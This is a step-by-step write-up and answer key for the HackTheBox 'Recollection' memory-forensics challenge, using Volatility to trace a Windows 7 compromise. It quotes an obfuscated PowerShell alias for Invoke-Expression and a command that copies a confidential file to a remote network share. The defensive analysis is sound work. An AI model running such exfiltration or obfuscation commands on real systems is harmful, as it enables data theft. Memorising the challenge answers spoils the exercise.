# [HackTheBox Sherlocks - Recollection](https://app.hackthebox.com/sherlocks/Recollection)
Created: 20/05/2024 19:51
Last Updated: 20/05/2024 21:49
* * *
![2ea32ee4179e70ceb9fa86b0f2d88056.png](../../../_resources/2ea32ee4179e70ceb9fa86b0f2d88056.png)
**Scenario:**
A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.

* * *
>Task 1: What is the Operating System of the machine?

![769aa7d537962935ed5c43edcda9f341.png](../../../_resources/769aa7d537962935ed5c43edcda9f341.png)
We got a single binary file which couldn't be opened with FTKImager or Autopsy (I tried) so I tried using `vol.py -f recollection.bin imageinfo` which should be the legitimate way to solve it cuz this binary file is memory file

And result from imageinfo plugin tell us its Windows 7 memory file
```
Windows 7
```

>Task 2: When was the memory dump created?
```
2022-12-19 16:07:30
```

>Task 3: After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

![d00c3d1d9cd7b087df6a406ebd717b83.png](../../../_resources/d00c3d1d9cd7b087df6a406ebd717b83.png)
We can use clipboard plugin for this `vol.py -f recollection.bin --profile=Win7SP1x64 clipboard` which you can see that suspicious data that appeared at the top

I used `vol.py -f recollection.bin --profile=Win7SP1x64 cmdscan` to find all command lines it could find 
![5e47d98406f71daa46938009e54e59f9.png](../../../_resources/5e47d98406f71daa46938009e54e59f9.png)
which it returns these command history for us, as you can see that an attacker got accessed to cmd then paste powershell command (successfully pasted which showed in powershell history)
```
(gv '*MDR*').naMe[3,11,2]-joIN''
```

>Task 4: The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

![9c9db845ebe4ffda03f7c030a794eeb0.png](../../../_resources/9c9db845ebe4ffda03f7c030a794eeb0.png)
I copied content of it then ran in Powershell which result shows that its IEX ([Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4)) which will run strings after it as command
```
Invoke-Expression
```

>Task 5: A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

![af72870983a384196d975b4259ba5e73.png](../../../_resources/af72870983a384196d975b4259ba5e73.png)
On powershell process history, you can see that an attacker tried to display content of Confidential file then pipe to other file on share folder
```
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

>Task 6: Following the above command, now tell us if the file was exfiltrated successfully?

![627f7c06d6cbcb66c0a951eba4c7a57a.png](../../../_resources/627f7c06d6cbcb66c0a951eba4c7a57a.png)
`vol.py -f recollection.bin --profile=Win7SP1x64 consoles`, consoles plugin is used for this one which is the better version of cmdscan which as you can see that it also displayed result of those commands

And we can see that network path is not found which mean its not success
```
No
```

>Task 7: The attacker tried to create a readme file. What was the full path of the file?

![70ccf0f2926e20f5bb4b9b91b6a79486.png](../../../_resources/70ccf0f2926e20f5bb4b9b91b6a79486.png)
Copy base64 string and throw it to your base64 decoder
![3a725e3892572b4961710910c0b1f482.png](../../../_resources/3a725e3892572b4961710910c0b1f482.png)
Look like an attacker tried to make everyone know that this system was hacked
```
C:\Users\Public\Office\readme.txt
```

>Task 8: What was the Host Name of the machine?

![1ca4f2e61a4cca6730543326e85ee5d2.png](../../../_resources/1ca4f2e61a4cca6730543326e85ee5d2.png)
An attacker also used `net users` command which help us with this task and next task
```
USER-PC
```

>Task 9: How many user accounts were in the machine?
```
3
```

>Task 10: In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

![04d38e9e4e88abdb275c696743f6767a.png](../../../_resources/04d38e9e4e88abdb275c696743f6767a.png)
We can use filescan plugin with grep to find for this file specifically (`vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep "passwords.txt"`) then we have full path of this file
```
\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

>Task 11: A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

![6dd3c2c2d6e196a2777bfe5a7dcdb5fa.png](../../../_resources/6dd3c2c2d6e196a2777bfe5a7dcdb5fa.png)
Back to result from consoles plugin, we can see that this exe file was executed
```
b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
```

>Task 12: Following the previous question, what is the Imphash of the malicous file you found above?

![61ca41be16b0af77fad73a51d1a308b4.png](../../../_resources/61ca41be16b0af77fad73a51d1a308b4.png)
Search file hash we got from previous task to VirusTotal, its a Loki stealer
![5821f13b1df00e7cc55d30bea58f3978.png](../../../_resources/5821f13b1df00e7cc55d30bea58f3978.png)
For implash, go to Details
```
d3b592cd9481e4f053b5362e22d61595
```

>Task 13: Following the previous question, tell us the date in UTC format when the malicious file was created?

![77e657e8b2059bf3baa924bbcdc03275.png](../../../_resources/77e657e8b2059bf3baa924bbcdc03275.png)
We still in Details tab on VirusTotal, scroll down a bit then you will see History section
```
2022-06-22 11:49:04
```

>Task 14: What was the local IP address of the machine?

![204d2be9807f151a9d75eb2dec9e05ca.png](../../../_resources/204d2be9807f151a9d75eb2dec9e05ca.png)
We can use netscan plugin for this one (`vol.py -f recollection.bin --profile=Win7SP1x64 netscan`)
And we can see it used the same Local Address (not loopback) to communicate
```
192.168.0.104
```

>Task 15: There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

![c056a329c0e3e330647652f6d4eed661.png](../../../_resources/c056a329c0e3e330647652f6d4eed661.png)
Its pstree plugin time! (`vol.py -f recollection.bin --profile=Win7SP1x64 pstree`)

As we already guessed from Task 3, it was spawned under cmd
```
cmd.exe
```

>Task 16: Attacker might have used an email address to login a social media. Can you tell us the email address?

Earlier We found that an attacker tried to create a text file to tell other user that this system was hacked and the word that we could use to find is "mafia" 
![57a566c371aedc82696fc0b99e44004d.png](../../../_resources/57a566c371aedc82696fc0b99e44004d.png)
I used strings to do this since i didn't know where to look for (`strings recollection.bin | grep "mafia"`) and it still landed us with an answer
```
mafia_code1337@gmail.com
```

>Task 17: Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

We saw wazuh's msi file in user's Download directory so it should be this one

But we can dump MS Edge history file to investigate too
![f9170669e983e767d8eac7ffe63d30ed.png](../../../_resources/f9170669e983e767d8eac7ffe63d30ed.png)
First I used `vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep "History"` to find location of History file and its address inside this binary

![98efcd89f4d5c06701448dd8dc18c375.png](../../../_resources/98efcd89f4d5c06701448dd8dc18c375.png)
Then use `mkdir Edge; vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 --dump-dir ./Edge` to create an output folder and dump that file using

It does not look like a legitimate History file but if you used "file" with it then we can confirm that we got the right one
![9a3e2dea98531b0f322c61935f8085e3.png](../../../_resources/9a3e2dea98531b0f322c61935f8085e3.png)
Opened it with DB Browser for SQLite and pick "urls" table, you can see that Wazuh is the only SIEM that appeared on this history
```
Wazuh
```

>Task 18: The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?

I didn't find other file were downloaded using MS Edge so I went back to volatility 
![6dd3c2c2d6e196a2777bfe5a7dcdb5fa.png](../../../_resources/6dd3c2c2d6e196a2777bfe5a7dcdb5fa.png)
Here is the result from consoles plugin, as you can see that there that there is `csrsss.exe` which totally look out of place here since you won't see a legitimate version of this file on anywhere beside `C:\Windows\System32`
```
csrsss.exe
```

![c2239951a5b2355e2c8afc98fd92eb98.png](../../../_resources/c2239951a5b2355e2c8afc98fd92eb98.png)
* * *
